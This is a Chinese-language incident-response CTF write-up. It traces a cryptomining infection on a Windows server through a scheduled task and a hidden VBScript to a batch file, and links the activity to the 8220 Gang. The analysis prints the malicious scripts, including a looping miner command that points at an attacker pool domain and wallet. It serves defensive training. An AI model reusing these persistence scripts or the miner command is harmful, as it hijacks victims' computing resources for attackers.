---
title: solar应急响应月赛（5月）
url: https://www.secpulse.com/archives/206357.html
source: 安全脉搏
date: 2025-07-02
fetch_date: 2025-10-06T23:28:40.485039
---

# solar应急响应月赛（5月）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# solar应急响应月赛（5月）

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[mX1@0](https://www.secpulse.com/newpage/author?author_id=50821)

2025-07-01

13,974

## 1 攻击者使用什么漏洞获取了服务器的配置文件？

> 题目描述：某某文化有限公司的运维小王刚刚搭建服务器发现cpu莫名的异常的升高请你帮助小王排查一下服务器，flag格式为：flag{CVE-2020-12345}

查看Administrator的桌面，存在CrushFTP

![](https://pic1.imgdb.cn/item/683c79c258cb8da5c8218d99.png)

搜CrushFTP近期CVE漏洞

![](https://pic1.imgdb.cn/item/683c7b8158cb8da5c8218ed0.png)

## 2 系统每天晚上系统都会卡卡的帮小明找到问题出在了那？

> 题目描述：flag为配置名称（无空格）

**可能的原因分析**

1. **计划任务（Task Scheduler）**

* Windows 默认有一些维护任务（如 `Defrag` 碎片整理、`WindowsUpdate` 自动更新）可能在夜间运行。
* 检查 `taskschd.msc`（任务计划程序）中的任务。

2. **Windows Update 自动更新**

* `WindowsUpdate` 可能配置为夜间自动更新，占用大量资源。

3. **磁盘碎片整理（Defrag）**

* 默认情况下，Windows 会定期进行磁盘优化（`ScheduledDefrag`）。

4. **防病毒扫描（Windows Defender 或第三方杀毒软件）**

* 可能设置了夜间全盘扫描。

5. **资源占用高的服务**

* 如 `Superfetch`（SysMain）、`Windows Search` 索引服务可能导致卡顿。

6. **虚拟内存（Pagefile）配置问题**

* 如果虚拟内存设置不合理，可能导致系统变卡。

根据以上思路，找到了恶意的计划任务，如下图

![](https://pic1.imgdb.cn/item/683c6dcc58cb8da5c82188bd.png)

**sql backing up就是导致每晚卡顿的原因**

* 知识：

`C:\Windows\System32\Tasks` 是 **Windows 操作系统存储计划任务（Scheduled Tasks）的默认路径**。

也可以通过 **任务计划程序（taskschd.msc）** 管理所有任务

## 3 恶意域名是什么？

> 题目描述：flag格式为：flag{xxx.xxxxxxxx.xxx}

查看计划任务调用的内容

![](https://pic1.imgdb.cn/item/683c679a58cb8da5c8218494.png)

这段代码是一个 XML 格式的操作指令，通常用于自动化任务或系统配置中。具体解释如下：

1. **`<Actions Context="Author">`** 表示这是一个"作者上下文"的操作（可能是创建或设计阶段使用的操作）
2. **`<Exec>`** 执行命令的指令
3. **`<Command>"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwsmprovhost.vbs"</Command>`** 指定要执行的命令是运行位于 SQL Server 2005(版本90)共享目录下的一个 VBScript 文件

找到该路径下的sqlwsmprovhost.vbs文件，并查看，如下图

![](https://pic1.imgdb.cn/item/683c685258cb8da5c82184e2.png)

这段 VBScript 代码的功能是创建一个 **WScript.Shell** 对象，并运行一个名为 **`sqlwscript.cmd`** 的批处理文件（隐藏窗口运行）。具体解释如下：

```
//创建一个 WScript.Shell 对象，用于执行系统命令或运行程序
set ws = createobject("wscript.shell")
```

```
//运行 "sqlwscript.cmd" 这个批处理文件，参数 `0` 表示隐藏窗口运行
ws.Run """sqlwscript.cmd""", 0
```

1. **`WScript.Shell`**

* 是 Windows 脚本宿主（WSH）提供的对象，用于执行系统命令、操作注册表、运行程序等。
* 这里主要用于运行外部程序（`.cmd` 文件）。

2. **`ws.Run """sqlwscript.cmd""", 0`**

* `Run` 方法用于执行指定的程序或命令。
* `"""sqlwscript.cmd"""` 的写法是因为 VBScript 需要用双引号包裹路径，而路径本身可能包含空格，所以用 `""` 进行转义（相当于 `"sqlwscript.cmd"`）。
* `0` 表示运行时不显示窗口（隐藏运行）。

然后，打开sqlwscript.cmd查看如下：

![](https://pic1.imgdb.cn/item/683c69d158cb8da5c82185d7.png)

这段批处理脚本 (`sqlwscript.cmd`) 是一个 **无限循环执行的挖矿脚本**，通常用于 **加密货币挖矿（可能是恶意挖矿程序）**。以下是详细分析：

```
@echo off
```

* 关闭命令回显，使脚本运行时不会显示执行的命令（隐蔽执行）。

```
cd /d "%~dp0"
```

* 切换到脚本所在的目录（`%~dp0` 表示当前批处理文件的完整路径）。
* 确保脚本能正确访问同目录下的文件（如 `sqlwpr.exe`）。

```
:start
```

* 定义一个标签 `:start`，用于循环跳转。

```
sqlwpr.exe -a rx/0 --url b.oracleservice.top --user 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -t 0
```

* **`sqlwpr.exe`** 是一个 **加密货币挖矿程序**（可能是恶意软件）。
* **参数解析**：

+ `-a rx/0`：指定挖矿算法（`RandomX`，常用于门罗币 Monero/XMR 挖矿）。
+ `--url b.oracleservice.top`：连接到的矿池服务器地址（矿工提交算力并获取奖励）。
+ `--user 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ`：挖矿钱包地址（收益归攻击者所有）。
+ `-t 0`：使用所有可用的 CPU 线程挖矿（最大化资源占用）。

```
goto start
```

* 跳回 `:start` 标签，形成无限循环，确保挖矿程序持续运行（即使崩溃也会重启）。

**所以 恶意域名是矿池服务器地址**

### 行为分析

1. **这是一个隐蔽的恶意挖矿脚本**：

* 通过 `@echo off` 和隐藏窗口运行（结合之前的 VBScript）来避免被发现。
* 无限循环确保挖矿程序长期驻留。

2. **使用的技术**：

* **`RandomX` 算法**（`rx/0`）通常用于 **门罗币（XMR）** 挖矿。
* 矿池地址 `b.oracleservice.top` 可能是攻击者控制的服务器。
* 钱包地址 `46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ` 用于接收挖矿收益。

3. **影响**：

* **CPU 资源占用极高**，导致系统变卡、发热增加。
* 长期运行会增加电费消耗，并可能缩短硬件寿命。
* 可能是通过木马或漏洞植入的（如恶意软件、钓鱼攻击等）。

### **应对措施**

1. **立即终止恶意进程**：

* 打开任务管理器（Ctrl+Shift+Esc），结束 `sqlwpr.exe` 和 `wscript.exe` 进程。
* 检查后台程序，关闭可疑项目。

2. **删除相关文件**：

* 找到脚本所在目录（`%~dp0`），删除 `sqlwscript.cmd` 和 `sqlwpr.exe`。
* 检查启动项（`msconfig` 或 `任务管理器 > 启动`），移除恶意条目。

3. **安全防护**：

* 使用杀毒软件（如 Windows Defender、Malwarebytes）全盘扫描。
* 检查系统是否被植入其他后门（如远控木马）。

4. **防止再次感染**：

* 不要随意运行来历不明的脚本或程序。
* 保持系统和软件更新，修补安全漏洞。

## 4 疑似是什么组织发动的攻击？

> 题目描述：flag格式为：flag{123XXX}（无空格注意大小写）

搜索恶意域名，发现是8220挖矿组织

![](https://pic1.imgdb.cn/item/683c6c6358cb8da5c82187f2.png)

继续搜索8220挖矿组织，搜到其全名

![](https://pic1.imgdb.cn/item/683c6cbd58cb8da5c821881f.png)

**最终 该组织为8220 Gang**

## 5 攻击者C2服务器IP是什么？

> 题目描述：flag格式为：flag{123.123.123.123}

查看挖矿程序的上传时间，确定时间大概在2025.5.27 23:20:00左右

![](https://pic1.imgdb.cn/item/683c76bc58cb8da5c8218bc0.png)

查询windows的安全日志，筛选 `5156` 事件（Windows 过滤平台放行连接），逐一查询这段时间之后powershell的出战痕迹

当然，也可以直接导出筛选日志进行关键词搜索

将已筛选的日志导出为txt文件，然后直接搜索powershell.exe关键词，找出可疑的出站目的IP地址，即为C2服务器IP

![](https://pic1.imgdb.cn/item/683c718a58cb8da5c8218a94.png)

**本文作者：[mX1@0](newpage/author?author_id=50821)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/206357.html**](https://www.secpulse.com/archives/206357.html)

点赞：
1
[评论：0](#goComment)
收藏：
1

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![ApoorvCTF Rust语言逆向实战](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202503061655549.png)

  ApoorvCTF Rust语言逆向实战](https://www.secpulse.com/archives/205975.html "详细阅读 ApoorvCTF Rust语言逆向实战")
* [![【总结】逻辑运算在Z3中运用+CTF习题](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407161541323.png)

  【总结】逻辑运算在Z3中运用+CTF习题](https://www.secpulse.com/archives/205237.html "详细阅读 【总结】逻辑运算在Z3中运用+CTF习题")
* [![LLVM IR 深入研究分析](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408191618204.png)

  LLVM IR 深入研究分析](https://www.secpulse.com/archives/205330.html "详细阅读 LLVM IR 深入研究分析")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2025/06/17/e9085b0f35fa467b070b19414ef613ce.png)](https://www.secpulse.com/new...